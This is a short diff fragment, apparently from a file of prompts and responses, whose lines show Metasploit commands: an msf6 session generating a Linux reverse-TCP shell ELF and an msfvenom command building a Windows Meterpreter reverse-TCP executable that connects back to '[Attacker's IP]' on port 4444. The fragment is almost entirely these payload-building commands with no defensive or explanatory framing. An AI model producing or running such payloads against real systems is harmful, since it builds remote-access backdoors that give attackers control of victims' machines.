@@ -22,6 +22,6 @@ msf6 payload(linux/x86/shell_reverse_tcp) > generate -f elf -o linux_shell
 ```
 ```
  Your response: 
-
+```
 $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
 ```
